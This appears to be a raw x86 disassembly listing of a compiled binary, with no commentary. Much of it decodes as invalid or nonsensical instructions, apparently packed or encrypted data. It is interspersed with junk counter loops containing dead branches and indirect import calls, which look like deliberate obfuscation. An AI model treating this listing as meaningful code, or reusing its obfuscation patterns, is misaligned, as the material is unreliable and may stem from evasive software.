  40e1c8:	xor    ah,BYTE PTR [esi-0x52665b40]
  40e1ce:	test   eax,0xf5eb7bb2
  40e1d3:	sub    al,0x4c
  40e1d5:	jp     0x40e204
  40e1d7:	ins    DWORD PTR es:[edi],dx
  40e1d8:	nop
  40e1d9:	cs cwde 
  40e1db:	sbb    al,0x7f
  40e1dd:	xor    eax,0x588492a1
  40e1e2:	dec    eax
  40e1e3:	into   
  40e1e4:	shl    BYTE PTR [ebp+0x245e7bd],0x1d
  40e1eb:	adc    eax,0xceff868c
  40e1f0:	jne    0x40e23c
  40e1f2:	cli    
  40e1f3:	int    0x38
  40e1f5:	fistp  WORD PTR [ebx]
  40e1f7:	fisub  DWORD PTR [ebx]
  40e1f9:	xor    al,ch
  40e1fb:	mov    edx,0xd284b287
  40e200:	sbb    ch,bh
  40e202:	(bad)
  40e206:	and    BYTE PTR [ecx-0x565da393],0x48
  40e20d:	mov    ah,bl
  40e20f:	fistp  WORD PTR [edi-0x70ee55e]
  40e215:	(bad)  
  40e216:	or     eax,0x193465bd
  40e21b:	sub    DWORD PTR [eax+0x353ea65d],0xffffff94
  40e222:	rol    BYTE PTR [ecx],1
  40e224:	popa   
  40e225:	jae    0x40e223
  40e227:	jle    0x40e29b
  40e229:	push   ebp
  40e22a:	jp     0x40e226
  40e22c:	push   edi
  40e22d:	mov    esp,0xbe62bafa
  40e232:	inc    esi
  40e233:	xchg   ecx,eax
  40e234:	sbb    dl,BYTE PTR [edi+0x30]
  40e237:	mov    ds:0x578dd0e7,eax
  40e23c:	inc    esi
  40e23d:	push   ebx
  40e23e:	js     0x40e275
  40e240:	hlt    
  40e241:	out    0x22,al
  40e243:	daa    
  40e244:	add    ecx,DWORD PTR [esi-0x1b]
  40e247:	dec    edx
  40e248:	shr    ah,0x97
  40e24b:	rcl    BYTE PTR [ebp-0x12b8c8b2],1
  40e251:	icebp  
  40e252:	adc    al,0x64
  40e254:	lea    ebx,[edx-0x1e55af54]
  40e25a:	jne    0x40e28e
  40e25c:	mov    ebp,0xf2df81ba
  40e261:	aam    0xa2
  40e263:	in     eax,0x8c
  40e265:	shl    bh,cl
  40e267:	xchg   esi,eax
  40e268:	fwait
  40e269:	dec    esp
  40e26a:	pop    edx
  40e26b:	xlat   BYTE PTR ds:[ebx]
  40e26c:	sub    eax,0x97a225c5
  40e271:	dec    ebp
  40e272:	call   0x602ebd6a
  40e277:	mov    esp,0x8d01899b
  40e27c:	inc    ebp
  40e27d:	cld    
  40e27e:	and    DWORD PTR ds:0x42fc7d,0x0
  40e288:	mov    ecx,DWORD PTR ds:0x42fc7d
  40e28e:	inc    ecx
  40e28f:	mov    DWORD PTR ds:0x42fc7d,ecx
  40e295:	cmp    DWORD PTR ds:0x42fc7d,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e4e3
  40e2b0:	cmp    DWORD PTR ds:0x42fc7d,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fc7d
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fc7d,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fc7d,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fcee,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fcee
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fcee,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fcee,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fcee,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fc81
  40e315:	call   DWORD PTR ds:0x42e3f7
  40e31b:	cmp    DWORD PTR ds:0x42fcee,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fcee
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fcee,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e714
  40e340:	mov    ecx,DWORD PTR ds:0x42e71c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fcf2,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	or     bh,BYTE PTR [edi-0x5bc49185]
  40e37c:	jo     0x40e3ee
  40e37e:	ret    
  40e37f:	jg     0x40e3f1
  40e381:	jo     0x40e316
  40e383:	(bad)  
  40e384:	lds    esi,FWORD PTR [ebx-0x420aee68]
  40e38a:	mov    ebp,0xd1ed077
  40e38f:	cmp    al,0x5c
  40e391:	call   0x5f6e:0x763c2bd5
  40e398:	mov    al,ds:0x521998c3
  40e39d:	sub    dh,dh
  40e39f:	or     ah,BYTE PTR [eax-0x41ef4bbd]
  40e3a5:	add    BYTE PTR [eax-0x73c314eb],cl
  40e3ab:	xchg   esp,eax
  40e3ac:	jnp    0x40e3a0
  40e3ae:	and    esp,DWORD PTR [edi]
  40e3b0:	pop    eax
  40e3b1:	and    al,0xb8
  40e3b3:	mov    dh,0xf1
  40e3b5:	add    BYTE PTR [esi-0x31],bl
  40e3b8:	loopne 0x40e3d4
  40e3ba:	mov    dh,0x8a
  40e3bc:	adc    ecx,ecx
  40e3be:	push   ebp
  40e3bf:	xor    ecx,DWORD PTR [esi-0x40]
  40e3c2:	pop    ds
  40e3c3:	iret   
  40e3c4:	ret    
  40e3c5:	mov    eax,0xc0629182
  40e3ca:	cmp    bh,BYTE PTR [ebp+0x4d]
  40e3cd:	xor    ah,BYTE PTR [ebp+0x72bab9b7]
  40e3d3:	cmp    bl,BYTE PTR [edi+0x64cd2287]
  40e3d9:	scas   eax,DWORD PTR es:[edi]
  40e3da:	ins    BYTE PTR es:[edi],dx
  40e3db:	mov    eax,0xbdc45499
  40e3e0:	jmp    DWORD PTR [esi]
  40e3e2:	iret   
  40e3e3:	out    dx,eax
  40e3e4:	nop
  40e3e5:	outs   dx,DWORD PTR ds:[esi]
  40e3e6:	cld    
  40e3e7:	daa    
  40e3e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3e9:	rcl    BYTE PTR [esi-0x48],cl
  40e3ec:	stc    
  40e3ed:	mov    ch,0x7
  40e3ef:	aas    
  40e3f0:	popa   
  40e3f1:	inc    ecx
  40e3f2:	push   edi
  40e3f3:	lds    ecx,FWORD PTR fs:[ecx+0x6f]
  40e3f7:	xlat   BYTE PTR ds:[ebx]
  40e3f8:	(bad)  
  40e3fa:	xor    eax,0xc55fbb25
  40e3ff:	add    esi,ebp
  40e401:	in     eax,0x58
  40e403:	sbb    DWORD PTR [ecx],ecx
  40e405:	jnp    0x40e44a
  40e407:	mov    bh,0xf0
  40e409:	xor    esp,0x3f
  40e40c:	xchg   ecx,eax
  40e40d:	das    
  40e40e:	out    0xc0,al
  40e410:	jb     0x40e413
  40e412:	xchg   edi,eax
  40e413:	(bad)  
  40e415:	sub    cl,BYTE PTR [edi]
  40e417:	jmp    0x40e472
  40e419:	jo     0x40e3bd
  40e41b:	jnp    0x40e492
  40e41d:	call   0x6845:0x48552c19
  40e424:	int    0xac
  40e426:	fbstp  TBYTE PTR [edx-0x6bd02832]
  40e42c:	aas    
  40e42d:	clc    
  40e42e:	adc    ebx,ebx
  40e430:	adc    ch,BYTE PTR [edx+0x6c615759]
  40e436:	sar    BYTE PTR [esi+0x44],cl
  40e439:	out    dx,eax
  40e43a:	xchg   edx,eax
  40e43b:	jae    0x40e400
  40e43d:	push   edx
  40e43e:	add    ebx,DWORD PTR [ebp+0x4131fe9d]
  40e444:	xchg   esp,eax
  40e445:	(bad)  
  40e446:	repnz aaa 
  40e448:	push   0xf
  40e44a:	add    al,0x80
  40e44c:	xchg   DWORD PTR ds:0xba21efc6,esi
  40e452:	call   0x146d:0xded1047c
  40e459:	sbb    eax,DWORD PTR [esi+0x7f]
  40e45c:	imul   ebp,DWORD PTR [eax],0xffffff98
  40e45f:	repnz sbb ah,BYTE PTR [edx+0x745bce35]
  40e466:	rcr    DWORD PTR [ebp+0x608fd63b],0x6b
  40e46d:	(bad)  cs:[eax+0x3b]
  40e471:	jb     0x40e47d
  40e473:	xchg   edi,eax
  40e474:	dec    edi
  40e475:	shr    eax,0x6d
  40e478:	shr    BYTE PTR [ebx+0x64e7ecac],0x83
  40e47f:	data16 (bad) 
  40e482:	cwde   
  40e483:	or     DWORD PTR [ebx+edi*4+0x3],ecx
  40e487:	stc    
  40e488:	rol    BYTE PTR [ebp-0x2ad86185],1
  40e48e:	push   eax
  40e48f:	std    
  40e490:	mov    edx,0x81443e4c
  40e495:	enter  0x218d,0x34
  40e499:	test   al,0x4
  40e49b:	pushf  
  40e49c:	jmp    0x6444f7f7
  40e4a1:	(bad)  
  40e4a3:	sub    cl,bh
  40e4a5:	sbb    BYTE PTR [ebx+0x31],ch
  40e4a8:	mov    ebx,0x720f556d
  40e4ad:	add    DWORD PTR [esi],edx
  40e4af:	stos   DWORD PTR es:[edi],eax
  40e4b0:	sbb    BYTE PTR [ebp-0x153a7513],bh
  40e4b6:	loope  0x40e45d
  40e4b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4b9:	repnz push es
  40e4bb:	and    DWORD PTR [ebx+ebx*1],0xffffffde
  40e4bf:	mov    cl,0xf
  40e4c1:	xchg   DWORD PTR [edx+0xd0df6],esi
  40e4c7:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4c9:	push   ebp
  40e4ca:	(bad)  
  40e4cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4cc:	mov    esi,0x45c72f83
  40e4d1:	call   0xf8dd6a07
  40e4d6:	and    ebx,0x399a
  40e4dc:	lea    eax,[ebp-0x18]
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0x9c9b740f
  40e4f5:	cmc    
  40e4f6:	push   ecx
  40e4f7:	mov    fs,WORD PTR [ebx+0x7fc37070]
  40e4fd:	jo     0x40e56f
  40e4ff:	push   esp
  40e500:	out    dx,al
  40e501:	sbb    BYTE PTR [eax+0x37],dh
  40e504:	mov    DWORD PTR [edi],eax
  40e506:	pop    ebp
  40e507:	cmp    al,0x8d
  40e509:	sbb    eax,0xb5cf22b
  40e50e:	xor    al,0xe2
  40e510:	not    BYTE PTR ds:0x803cd2d4
  40e516:	jns    0x40e51f
  40e518:	mov    WORD PTR [ebx],?
  40e51a:	xchg   DWORD PTR [edi],esi
  40e51c:	add    al,0x9c
  40e51e:	mov    bh,0xed
  40e520:	push   0x15434918
  40e525:	inc    esp
  40e526:	push   es
  40e527:	(bad)  
  40e528:	rcl    DWORD PTR [esp+esi*4-0x80],1
  40e52c:	rcr    DWORD PTR [edi+0x6c],cl
  40e52f:	pop    ss
  40e530:	sbb    BYTE PTR [eax-0x36],0x68
  40e534:	xor    bl,cl
  40e536:	xchg   edi,eax
  40e537:	into   
  40e538:	inc    esp
  40e539:	push   fs
  40e53b:	jns    0x40e4f5
  40e53d:	rol    BYTE PTR [esi+0x7ddf5b1f],1
  40e543:	mov    cl,0x61
  40e545:	data16 mov bh,0xa3
  40e548:	lahf   
  40e549:	mov    dh,0xbe
  40e54b:	inc    ebp
  40e54c:	nop
  40e54d:	inc    edi
  40e54e:	test   dh,al
  40e550:	pop    ebx
  40e551:	cwde   
  40e552:	fstp   TBYTE PTR [ebx]
  40e554:	mov    WORD PTR [ebp+0x3f],cs
  40e557:	sbb    al,0x70
  40e559:	sti    
  40e55a:	loop   0x40e52f
  40e55c:	sbb    edx,DWORD PTR [edx]
  40e55e:	fisttp WORD PTR [ebp-0x6f]
  40e561:	mov    ch,BYTE PTR [esi]
  40e563:	mov    cl,al
  40e565:	pop    ds
  40e566:	shr    BYTE PTR [eax+0x40d4b0b5],cl
  40e56c:	push   ss
  40e56d:	test   BYTE PTR [esi-0x17],dh
  40e570:	fsubrp st(7),st
  40e572:	sbb    esp,ebp
  40e574:	jno    0x40e515
  40e576:	mov    edx,0x33cad298
  40e57b:	stos   BYTE PTR es:[edi],al
  40e57c:	in     eax,0x2d
  40e57e:	or     DWORD PTR ds:0xec358ea3,0xfbcfda39
  40e588:	mov    bh,0x52
  40e58a:	or     BYTE PTR [eax-0x5f],bh
  40e58d:	iret   
  40e58e:	gs loope 0x40e57b
  40e591:	aaa    
  40e592:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e593:	xchg   ecx,eax
  40e594:	push   esp
  40e595:	(bad)  
  40e596:	cmp    BYTE PTR [eax+eiz*2],ch
  40e599:	pushf  
  40e59a:	and    bh,BYTE PTR [ecx-0x1f]
  40e59d:	inc    edi
  40e59e:	inc    BYTE PTR [eax]
  40e5a0:	xor    al,0xa0
  40e5a2:	sub    DWORD PTR [edx+esi*2],ebx
  40e5a5:	outs   dx,BYTE PTR ds:[esi]
  40e5a6:	cwde   
  40e5a7:	xor    ch,cl
  40e5a9:	add    ebp,DWORD PTR [edi+0x7dbf2afb]
  40e5af:	adc    ch,dl
  40e5b1:	pop    ds
  40e5b2:	std    
  40e5b3:	and    al,0x6
  40e5b5:	mov    BYTE PTR [edi+eiz*4-0x72a2868b],cl
  40e5bc:	mov    esp,0xd9aa111e
  40e5c1:	mov    ah,0xeb
  40e5c3:	js     0x40e54a
  40e5c5:	cmp    dh,BYTE PTR [edx-0x46]
  40e5c8:	add    al,0x54
  40e5ca:	fs xchg edx,eax
  40e5cc:	int    0xa9
  40e5ce:	jge    0x40e5f2
  40e5d0:	push   esp
  40e5d1:	fcom   st(4)
  40e5d3:	test   ah,ah
  40e5d5:	cwde   
  40e5d6:	sahf   
  40e5d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5d8:	push   0xffffff81
  40e5da:	push   edx
  40e5db:	dec    eax
  40e5dc:	fwait
  40e5dd:	jg     0x40e5b2
  40e5df:	cmp    eax,ebp
  40e5e1:	or     al,0xa1
  40e5e3:	iretw  
  40e5e5:	mov    ?,WORD PTR [ecx+esi*8]
  40e5e8:	les    edx,FWORD PTR [ebx]
  40e5ea:	pop    ss
  40e5eb:	sbb    eax,0x3b7e34a4
  40e5f0:	test   DWORD PTR [eax+0x3a7350b3],edx
  40e5f6:	cld    
  40e5f7:	pop    esp
  40e5f8:	fcom   DWORD PTR [eax-0x377c0444]
  40e5fe:	(bad)
  40e602:	inc    esi
  40e603:	clc    
  40e604:	mov    eax,DWORD PTR [edi]
  40e606:	pushf  
  40e607:	sub    bl,ah
  40e609:	jne    0x40e5bd
  40e60b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e60c:	fdiv   st,st(0)
  40e60e:	sbb    DWORD PTR [ebx+0x4e045362],esi
  40e614:	call   0x7fd2c01
  40e619:	mov    esp,DWORD PTR [edx]
  40e61b:	mov    ah,0x3b
  40e61d:	jnp    0x40e694
  40e61f:	xchg   ebx,eax
  40e620:	(bad)  
  40e621:	into   
  40e622:	bound  esp,QWORD PTR ds:0x3491e17b
  40e628:	mov    ah,0xdd
  40e62a:	imul   ebp,DWORD PTR gs:[edx],0x4a1d41b
  40e631:	inc    esp
  40e632:	inc    edi
  40e633:	xlat   BYTE PTR ds:[ebx]
  40e634:	and    eax,0x599b2b00
  40e639:	fwait
  40e63a:	test   DWORD PTR [edx+ecx*4-0x715e7305],ebx
  40e641:	call   0x4dee:0x3387be74
  40e648:	xor    bl,BYTE PTR [edi+eiz*8+0x1e]
  40e64c:	mov    eax,DWORD PTR [ebp-0x18]
  40e64f:	and    DWORD PTR ds:0x42fcfa,0x0
  40e659:	jmp    0x40e66b
  40e65e:	mov    ebx,DWORD PTR ds:0x42fcfa
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fcfa,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fcfa,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fcfa,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e3fb
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e09c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fc81,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fc59,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	push   cs
  40e6db:	sub    DWORD PTR [edi-0x4b],edi
  40e6de:	push   ecx
  40e6df:	mov    ds:0x7fc37070,al
  40e6e4:	jo     0x40e756
  40e6e6:	(bad)  
  40e6e7:	push   ds
  40e6e8:	cmp    eax,0x4c912985
  40e6ed:	xchg   ebx,eax
  40e6ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6ef:	outs   dx,DWORD PTR ds:[esi]
  40e6f0:	outs   dx,BYTE PTR ds:[esi]
  40e6f1:	inc    edx
  40e6f2:	pushf  
  40e6f3:	test   BYTE PTR [eax-0x63],cl
  40e6f6:	mov    cl,0xa6
  40e6f8:	dec    sp
  40e6fa:	mov    ebx,DWORD PTR [edi-0x71]
  40e6fd:	stc    
  40e6fe:	(bad)  
  40e6ff:	pop    ecx
  40e700:	push   ecx
  40e701:	sbb    DWORD PTR [edx+0x46],edx
  40e704:	push   ebx
  40e705:	jns    0x40e6b8
  40e707:	adc    BYTE PTR [edi-0x4930551f],dh
  40e70d:	arpl   WORD PTR [ebx-0x45],bx
  40e710:	add    al,0x96
  40e712:	or     eax,0xacb362bb
  40e717:	and    eax,0x8243f5d1
  40e71c:	mov    edx,0xd5eb312
  40e721:	clc    
  40e722:	push   0x6a
  40e724:	xor    ebp,edx
  40e726:	lea    esi,[edx+0xc021e60]
  40e72c:	pushf  
  40e72d:	inc    esi
  40e72e:	lods   eax,DWORD PTR ds:[esi]
  40e72f:	or     esi,DWORD PTR [ebx]
  40e731:	cwde   
  40e732:	jmp    0x77fc:0x56d80322
  40e739:	push   ss
  40e73a:	and    cl,ah
  40e73c:	and    BYTE PTR [ebp-0x59],bl
  40e73f:	loope  0x40e784
  40e741:	xchg   edi,eax
  40e742:	inc    eax
  40e743:	or     BYTE PTR [edi],0x1b
  40e746:	fwait
  40e747:	test   ebp,ebp
  40e749:	call   0xa2bc:0x38a486aa
  40e750:	pop    edx
  40e751:	ficom  DWORD PTR [edi-0x63088d70]
  40e757:	pop    ds
  40e758:	xchg   edx,eax
  40e759:	push   esi
  40e75a:	or     eax,0xe3a864d1
  40e75f:	sbb    DWORD PTR [ecx-0x67],edi
  40e762:	std    
  40e763:	xchg   edx,eax
  40e764:	(bad)  
  40e765:	in     al,0x15
  40e767:	pop    ebx
  40e768:	ret    
  40e769:	xor    DWORD PTR [ecx],0x6c
  40e76c:	or     BYTE PTR [edx],bl
  40e76e:	pop    ecx
  40e76f:	inc    ecx
  40e770:	mov    edi,0x2e139133
  40e775:	sar    DWORD PTR [ebp-0x20834e30],1
  40e77b:	es stos DWORD PTR es:[edi],eax
  40e77d:	add    DWORD PTR [ecx-0x2d],0x6b
  40e781:	test   DWORD PTR [edi+0x39],edi
  40e784:	stos   DWORD PTR es:[edi],eax
  40e785:	or     DWORD PTR [edi-0x7b],ecx
  40e788:	xor    dh,BYTE PTR [ebx]
  40e78a:	les    ebx,FWORD PTR [edx-0x176e67e0]
  40e790:	and    esp,DWORD PTR [edi+eax*8]
  40e793:	ja     0x40e766
  40e795:	mov    eax,ds:0x9e3fb799
  40e79a:	loop   0x40e817
  40e79c:	add    ebx,edx
  40e79e:	xor    BYTE PTR [ebx-0x34dcb9fb],dh
  40e7a4:	inc    ebx
  40e7a5:	gs lea ebp,ss:[ebp+eiz*2-0x1a894bb0]
  40e7ae:	lods   al,BYTE PTR ds:[esi]
  40e7af:	loopne 0x40e815
  40e7b1:	ins    DWORD PTR es:[edi],dx
  40e7b2:	cmp    al,0xa7
  40e7b4:	xor    al,0xb4
  40e7b6:	(bad)  
  40e7b7:	xor    ebp,eax
  40e7b9:	and    eax,0x35d9c976
  40e7be:	adc    BYTE PTR [ecx],dh
  40e7c0:	js     0x40e7f3
  40e7c2:	push   edx
  40e7c3:	xchg   ebx,eax
  40e7c4:	inc    edx
  40e7c5:	mov    ch,0xfd
  40e7c7:	xor    al,0x8f
  40e7c9:	retf   0x5548
  40e7cc:	(bad)  
  40e7cd:	lods   eax,DWORD PTR ds:[esi]
  40e7ce:	xor    eax,0x7baf77d0
  40e7d3:	inc    esi
  40e7d4:	js     0x40e834
  40e7d6:	push   es
  40e7d7:	push   esi
  40e7d8:	dec    eax
  40e7d9:	cs mov esi,0x25a2eeda
  40e7df:	adc    eax,0x41b9c3f0
  40e7e4:	setge  BYTE PTR [ebp+0x3c60771f]
  40e7eb:	cwde   
  40e7ec:	out    0x23,al
  40e7ee:	test   BYTE PTR [esi-0x3e],bh
  40e7f1:	xchg   edx,eax
  40e7f2:	rol    DWORD PTR [edx+0x12928a0f],0x92
  40e7f9:	inc    ebx
  40e7fa:	repnz pop ss
  40e7fc:	or     DWORD PTR [ebx],ebx
  40e7fe:	retf   0xe7a1
  40e801:	inc    ebp
  40e802:	xor    al,dh
  40e804:	nop
  40e805:	sub    esp,esi
  40e807:	mov    ch,BYTE PTR [ebx]
  40e809:	dec    ecx
  40e80a:	cmp    DWORD PTR [ecx],ecx
  40e80c:	arpl   WORD PTR [eax+0x31],dx
  40e80f:	and    eax,DWORD PTR [edx-0x54f74d59]
  40e815:	xchg   ebp,eax
  40e816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e817:	mov    DWORD PTR [edx],edx
  40e819:	jg     0x40e7ab
  40e81b:	pop    ecx
  40e81c:	inc    edi
  40e81d:	sbb    eax,0x1098d19f
  40e822:	lea    esp,[ecx]
  40e824:	out    dx,al
  40e825:	adc    eax,0xebbbfc97
  40e82a:	push   edi
  40e82b:	or     BYTE PTR [esi+0x37],dl
  40e82e:	test   al,0x49
  40e830:	jnp    0x40e7c3
  40e832:	imul   ecx,DWORD PTR [ebx+0x69158100],0x670042fc
  40e83c:	push   eax
  40e83d:	add    BYTE PTR [eax],al
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fc8d,0x42fcfe
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fc61
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e09c,0x42e66f
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e68b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fc51,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fc51
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fc51,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fc51,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fc51,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e167
  40e8ca:	call   DWORD PTR ds:0x42e3ff
  40e8d0:	cmp    DWORD PTR ds:0x42fc51,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fc51
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fc51,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fd0a
  40e8f8:	adc    DWORD PTR ds:0x42e67f,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e677,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e67b,0x42e66f
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fc81
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fc8d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e68b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	or     eax,0x244b0b69
  40e94e:	mov    al,ds:0x7fc37070
  40e953:	jo     0x40e9c5
  40e955:	outs   dx,BYTE PTR ds:[esi]
  40e956:	stos   DWORD PTR es:[edi],eax
  40e957:	xor    BYTE PTR [ebx+edx*8],dl
  40e95a:	rcl    BYTE PTR [ecx-0x677e56f5],1
  40e960:	cli    
  40e961:	(bad)  
  40e962:	scas   al,BYTE PTR es:[edi]
  40e963:	adc    al,0xb1
  40e965:	call   DWORD PTR [edi]
  40e967:	jno    0x40e931
  40e969:	mov    es,edx
  40e96b:	data16 test cl,dh
  40e96e:	pop    eax
  40e96f:	into   
  40e970:	pop    ds
  40e971:	(bad)  
  40e972:	sbb    bh,BYTE PTR ds:0xc6988607
  40e978:	jmp    FWORD PTR [esi+ebp*8-0x7532ea4f]
  40e97f:	or     dl,dl
  40e981:	gs stos BYTE PTR es:[edi],al
  40e983:	xchg   edi,eax
  40e984:	gs in  eax,0xa5
  40e987:	inc    ebp
  40e988:	rcl    dl,0x9d
  40e98b:	ds int 0x91
  40e98e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e98f:	and    BYTE PTR [edi+ecx*1],dh
  40e992:	jmp    FWORD PTR [ecx+0x19d321e6]
  40e998:	cmp    ebp,DWORD PTR [ebx-0x6e]
  40e99b:	(bad)  
  40e99e:	fcomp  QWORD PTR [ebp-0x3102f44b]
  40e9a4:	stos   DWORD PTR es:[edi],eax
  40e9a5:	push   0xffffffcf
  40e9a7:	scas   eax,DWORD PTR es:[edi]
  40e9a8:	push   eax
  40e9a9:	push   es
  40e9aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9ab:	jl     0x40e97c
  40e9ad:	push   0xe153b94d
  40e9b2:	test   BYTE PTR [edi+0x1a768545],bl
  40e9b8:	jmp    0xed1ed890
  40e9bd:	int3   
  40e9be:	out    0x2d,al
  40e9c0:	lock mov esp,0xc33e488c
  40e9c6:	bound  eax,QWORD PTR [ebx+0x12e53988]
  40e9cc:	cld    
  40e9cd:	push   esi
  40e9ce:	and    eax,0x5dd7523a
  40e9d3:	pusha  
  40e9d4:	xchg   esi,eax
  40e9d5:	stc    
  40e9d6:	xchg   esi,eax
  40e9d7:	sub    ch,dh
  40e9d9:	(bad)  
  40e9da:	jmp    0x40e970
  40e9dc:	lds    eax,FWORD PTR [edx-0x14a295ca]
  40e9e2:	gs inc edx
  40e9e4:	mov    ebx,0xccc84543
  40e9e9:	and    BYTE PTR [ebp+0x2474b98b],dl
  40e9ef:	xchg   ebp,eax
  40e9f0:	cmc    
  40e9f1:	dec    ecx
  40e9f2:	sbb    edx,0xd
  40e9f5:	std    
  40e9f6:	mov    edi,0x231aca3d
  40e9fb:	in     al,0xd8
  40e9fd:	shl    DWORD PTR [edi],0x71
  40ea00:	mov    cl,0x8e
  40ea02:	cmp    cl,BYTE PTR [bx+0x25d4]
  40ea07:	inc    ebx
  40ea08:	add    ebx,ecx
  40ea0a:	imul   eax,DWORD PTR [ebp-0x7606cb6b],0xffffffc3
  40ea11:	adc    ch,BYTE PTR [ecx-0x74a9c97c]
  40ea17:	shl    BYTE PTR [ebx],0x5c
  40ea1a:	dec    ecx
  40ea1b:	das    
  40ea1c:	mov    eax,ds:0x8c2efc13
  40ea21:	add    al,bl
